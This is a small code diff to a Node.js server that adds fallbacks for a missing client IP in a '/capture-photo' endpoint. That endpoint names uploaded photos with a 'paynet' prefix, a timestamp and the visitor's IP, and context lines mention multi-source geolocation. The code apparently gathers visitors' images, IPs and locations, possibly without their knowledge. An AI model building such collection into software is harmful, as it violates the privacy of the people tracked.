@@ -107,7 +107,7 @@ function getClientIP(req) {
     return process.env.MOCK_PUBLIC_IP;
   }
 
-  return socketIP;
+  return socketIP || 'unknown';
 }
 
 // Multi-source geolocation API with fallback
@@ -583,9 +583,10 @@ app.post("/capture-photo", async (req, res) => {
       return res.status(400).json({ success: false, message: "No photo data" });
     }
 
-    const ip = getClientIP(req);
+    const ip = getClientIP(req) || "unknown";
     const timestamp = new Date().toISOString().replace(/:/g, "-");
-    const publicId = `paynet_${timestamp}_${ip.replace(/[.:]/g, "-")}`;
+    const safeIp = String(ip).replace(/[.:]/g, "-");
+    const publicId = `paynet_${timestamp}_${safeIp}`;
 
     let photoUrl = null;
     let filename = null;
